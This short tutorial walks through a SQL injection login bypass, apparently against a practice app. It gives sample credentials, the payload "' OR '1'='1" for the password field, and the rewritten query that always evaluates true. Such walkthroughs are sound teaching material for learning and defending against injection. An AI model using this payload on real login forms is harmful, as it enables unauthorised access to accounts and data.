Exploiting the SQL Injection Vulnerability

Test the Application:
        Run the app and try logging in using valid credentials (admin/admin123 and user/userpass).

Inject SQL:
        Try using the following input to bypass the login:

        Username: admin
        Password: ' OR '1'='1

This SQL injection modifies the query to:


SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1' = '1'

This always evaluates as true, allowing the attacker to bypass authentication.
